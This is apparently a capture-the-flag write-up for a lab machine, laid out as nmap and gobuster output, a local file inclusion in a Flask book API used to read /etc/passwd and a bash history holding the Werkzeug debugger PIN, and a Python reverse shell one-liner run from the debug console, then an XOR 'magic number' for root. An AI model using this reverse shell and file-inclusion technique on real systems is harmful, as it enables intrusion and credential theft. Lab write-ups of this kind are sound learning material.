nmap results
```
└─$ sudo nmap -sV -p- 10.10.179.209
[sudo] password for gomez22: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-08 19:13 PDT
Nmap scan report for 10.10.179.209
Host is up (0.17s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 3.6.9)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```

gobuster finds
```
/assets
/books.html
/images
/javascript
```

on /login.html
```
<!--Still Working on this page will add the backend support soon, also the debugger pin is inside sid's bash history file -->
```

on `http://10.10.179.209/assets/js/api.js`
```
function getAPIURL() {
var str = window.location.hostname;
str = str + ":5000"
return str;

    }


async function getUsers() {
    var u=getAPIURL();
    let url = 'http://' + u + '/api/v2/resources/books/random4';
    try {
        let res = await fetch(url);
	return await res.json();
    } catch (error) {
        console.log(error);
    }
}

async function renderUsers() {
    let users = await getUsers();
    let html = '';
    users.forEach(user => {
        let htmlSegment = `<div class="user">
	 	        <h2>Title : ${user.title}</h3> <br>
                        <h3>First Sentence : </h3> <br>
			<h4>${user.first_sentence}</h4><br>
                        <h1>Author: ${user.author} </h1> <br> <br>        
                </div>`;

        html += htmlSegment;
   });
   
    let container = document.getElementById("respons");
    container.innerHTML = html;
}
renderUsers();
//the previous version of the api had a paramter which lead to local file inclusion vulnerability, glad we now have the new version which is secure.
```

on port `:5000/api`
```
API Documentation
Since every good API has a documentation we have one as well!
The various routes this API currently provides are:

/api/v2/resources/books/all (Retrieve all books and get the output in a json format)

/api/v2/resources/books/random4 (Retrieve 4 random records)

/api/v2/resources/books?id=1(Search by a specific parameter , id parameter)

/api/v2/resources/books?author=J.K. Rowling (Search by a specific parameter, this query will return all the books with author=J.K. Rowling)

/api/v2/resources/books?published=1993 (This query will return all the books published in the year 1993)

/api/v2/resources/books?author=J.K. Rowling&published=2003 (Search by a combination of 2 or more parameters)
```

Received a result from `v1` api so we need to enumerate this -> `http://10.10.179.209:5000/api/v1/resources/books?id=1`


on :5000/console
```
    SECRET = "YsN605qwnNCuWMRxbTtT";
```



http://10.10.137.217:5000/api/v1/resources/books?show=/etc/passwd - we have LFI vuln
```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
```

http://10.10.137.217:5000/api/v1/resources/books?show=/home/sid/.bash_history
`cd /home/sid whoami export WERKZEUG_DEBUG_PIN=123-321-135 echo $WERKZEUG_DEBUG_PIN python3 /home/sid/api.py ls exit`


```import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.13.46.127",1111));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")```

We're in...
```
$ whoami
whoami
sid

```

getting the magic number using ghidra(placeholder)
```
```

magic number!
```
 python3 -c "print(0x5dcd21f4^0x5db3^0x1116)"
1573743953
```

We entered the magic number and got a root shell!
